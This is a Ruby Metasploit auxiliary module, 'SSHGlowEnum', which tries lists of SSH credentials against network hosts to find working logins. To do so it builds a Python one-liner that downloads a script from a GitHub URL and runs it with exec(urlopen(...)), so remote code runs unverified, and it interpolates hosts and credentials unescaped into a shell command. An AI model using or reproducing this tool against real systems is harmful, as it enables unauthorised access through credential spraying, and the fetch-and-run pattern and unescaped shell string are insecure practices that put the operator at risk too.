
require "msf/core"


class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Scanner

    Rank = NormalRanking
    
    def initialize(info = {})
        super(update_info(info,
            'Name'  =>  'SSHGlowEnum',
            'Description'   =>  %q{
                This module will find our access in network.
            },
            'Author'    =>  ["Abdallah Mohamed Elsharif"],
            'License'   =>  MSF_LICENSE,
            'Version'   =>  '1.0'
        ))

        register_options([
            OptString.new('Creds',[true,'File or user1:pass1,user2:pass2 or single']),
            OptInt.new('DELAY', [true, "Delay interval in seconds", 5])
        ],self.class)

        self.deregister_options('THREADS')

    end

    def runSSHGlowEnum(hosts,creds,delay)
        # python3 path
        py_path = IO.popen("which python3").read.strip

        # check if python3 already installed
        if py_path.empty? then
            return print_error("Python3 not installed please install it to use the module")
        else
            print_status("Try to load SSHGlow and perform scanning on targets\n")
            py_space = ' ' * 4
            py_code = "'import urllib; import sys; from urllib.request import urlopen\n"
            py_code += "try:\n#{py_space}exec(urlopen(\"https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py\").read().decode(\"utf-8\"))\n"
            py_code += "#{py_space}run(\"#{hosts}\",\"#{creds}\",delay=#{delay})\n"
            py_code += "except KeyboardInterrupt:\n"
            py_code += "#{py_space}sys.exit(1)\n"
            py_code += "except urllib.error.URLError:\n"
            py_code += "#{py_space}print(\"\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow\")'"
            
            puts(IO.popen("#{py_path} -c #{py_code}").read() + "\n")
        end
    end

    def handle_file_args(file)
        # convert file content to SSHGlow format 
        args = ''
        lines = IO.readlines(file)
        counter = 1
        lines.each do |c|
            args += c.strip()
            args += ',' if lines.length != counter
            counter += 1
        end

        return args
    end

    def run()
        hosts = datastore['RHOSTS']
        creds = datastore['Creds']
        delay = datastore['Delay'].to_s

        # if targets in file
        hosts = handle_file_args(hosts) if File.file?(hosts)

        # if creds in file
        creds = handle_file_args(creds) if File.file?(creds) 

        runSSHGlowEnum(hosts,creds,delay)
        print_status("SSHGlow Finished !!")
    end
end